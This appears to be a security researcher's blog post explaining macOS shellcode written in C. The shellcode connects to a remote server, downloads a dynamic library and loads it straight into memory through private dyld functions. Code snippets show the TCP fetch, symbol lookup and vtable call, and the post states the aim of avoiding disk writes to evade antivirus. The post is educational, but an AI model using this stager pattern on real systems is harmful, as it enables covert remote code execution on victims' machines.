---
layout: post
title: Loading from memory
draft: true
---

Building shell code and playing with assembly is my idea of fun. In this article I introduce shellcode that executes to download a dynamic library from a TCP connection and loads it without ever touching the disk. On MacOS, there are several methods of doing that [1], but I would like to show another alternative which possibly requires less code to implement.

## TL;DR;

I reuse functions in DYLD that were never meant to be used externally.

## Shellcode Compiler

A while back I introduced a utility called [shellcc](https://github.com/nologic/shellcc) which is built to assist with building shellcode using a high level language like C. It is called _shellcc_ only because it constructs very compact byte code of instructions. Unfortunately, it does not really handle a lot of the important use-cases of for real shellcode construction. Use-cases such as character restrictions. As such, the tool serves another purpose really well.

I show this use-case in an introductory walk through:

<center><iframe width="420" height="315" src="https://www.youtube.com/watch?v=yg9svg9xE8g" frameborder="0" allowfullscreen></iframe></center>

When I started out my work on iOS, I did not know Aarch64 assembly very well. So, I needed a boon to help me bootstrap. This was the other purpose of _shellcc_ - an educational tool. I would use it to compile basic C programs in order to understand how the assembly is written to make system calls and process data. So, the tool is kind of an 80% solution that would give me template assembly that I could later play with. It also helped me with reverse engineering. Specifically to test theories about what certain blocks from IDAPro might have looked like in a high level language.

On semi-regular basis, I try to do a presentation at the NYU OSIRIS lab for educational purposes. I pick a topic that I had played with recently and found useful and present in practical detail. I wanted to do this with _shellcc_ and, so, I came up with a practial example: *How to write one of the most common shellcodes? One that connects to a TCP port, downloads a dylib and loads it into the process space.* As an added challenge, I wanted to do so without touching disk (and triggering AV's). This is what I would like to present in this blog. Of course, as I've mentioned earlier, there is more than one way.

## The Technique

The file that implements the technique is called [injectdyld.c](https://github.com/nologic/shellcc/blob/master/shellcode/injectdyld.c) and can be found in the github repository. The name is a bit misleading, but the the technique is there.

First, we connect to the port and download the library:

```c
    bzero((struct sockaddr *)&serv_addr,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = SERVER_IP;
    serv_addr.sin_port = htons(SERVER_PORT);

    // Connect to the remote host.
    if(scc_connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) {
        // If not, clean up and bail.
        scc_exit(44);
    }

    int fileSize = receivefile(sockfd, dyld_buffer, mem_size);
```

Next, we load the dynamic loader:

```c
    int dyld_fd = scc_open("/usr/lib/dyld", O_RDONLY, 0);
    void* dyld_buf = scc_mmap(NULL, mem_size, PROT_READ, MAP_PRIVATE, dyld_fd, 0);
```

This step is a bit wasteful because the process would've likely already had the dynamic loader mapped in memory. However, we are in shell code and it is a lot easier to map the file than to find the existing location.

Then, we find the symbol `dlsym` which will help us find other symbols in the process space.

```c
    typedef void* (*dlsym_t)(void* handle, const char* symbol);
    dlsym_t dlsym = (dlsym_t)findSymbol64(dyld_buf, mem_size, "_dlsym", 6);
```

The `findSymbol64` exists in the shellcode and it parses the Mach-O file of `dyld` to locate the function.

Then we locate the `loadFromMemory` function or, rather, a C++ class constructor.

```c
    typedef void* (*loadFromMemory_t)
       (const uint8_t* mem, uint64_t len, const char* moduleName);

    loadFromMemory_t loadFromMemory = (loadFromMemory_t)findSymbol64(
          dyld_buf, mem_size, "__ZN4dyld14loadFromMemoryEPKhyPKc", 33);

    void* image = loadFromMemory(dyld_buffer, fileSize, NULL);
```

The [__ZN4dyld14loadFromMemoryEPKhyPKc](https://opensource.apple.com/source/dyld/dyld-353.2.1/src/dyld.cpp) function was discovered by analyzing the dyld source code for how it loads Mach-O's into memory. This function will construct a class in memory to internally describe the layout and all the features that the system cares about.

```c++
ImageLoader* loadFromMemory(const uint8_t* mem, uint64_t len, const char* moduleName)
{
    // if fat wrapper, find usable sub-file
    const fat_header* memStartAsFat = (fat_header*)mem;
    uint64_t fileOffset = 0;
    uint64_t fileLength = len;
    if ( memStartAsFat->magic == OSSwapBigToHostInt32(FAT_MAGIC) ) {
        if ( fatFindBest(memStartAsFat, &fileOffset, &fileLength) ) {
            mem = &mem[fileOffset];
            len = fileLength;
```

Next is the easy part. This is where we force the loaded Mach-O file to join the process as a proper dynamic library.

```c
    typedef void (*registerInterposing)(void* _this);

    // `vtable for'ImageLoaderMachOCompressed
    ((registerInterposing) (*( (*(uint8_t***)image) + 64))) (image);
```

Because we are not implementing this in C++, we don't get the nice language abstractions to class objects. So, instead we have to force an instance call. Remember, back in the day, C++ was implemented as C++ to C translator, so we know this has to be possible.

We dereference the image object to obtain the `vtable`, we then dereference again at an offset to get the function of our dreams. We cast the pointer to a function pointer and call it with the pointer to the object as the first parameter. C++ functions (when looked through the eyes of C) expect the first parameter to the `this` pointer.

The `registerInterposing` is a function that is called when we inject libraries into the process by using the environment variable (i.e. `DYLD_INSERT_LIBRARIES`). Using this private interface activates the internal workings of DYLD to load libraries properly to be used by the rest of the process.

```c
    foo_t foo = dlsym(RTLD_DEFAULT, "foo");

    // call the desired procedure.
    int ret = foo();
```

Finally, we execute our library function to kick off the maliciously injected code.

## Conclusion
Using functions `loadFromMemory` and `registerInterposing` seem simple but it was not obvious without a fairly in-depth analysis of DYLD. This method is useful when the alternatives might not be applicable.


---
[1] Objective-C runtime method (https://s3.amazonaws.com/s3.synack.com/infiltrate.pdf slide 29)







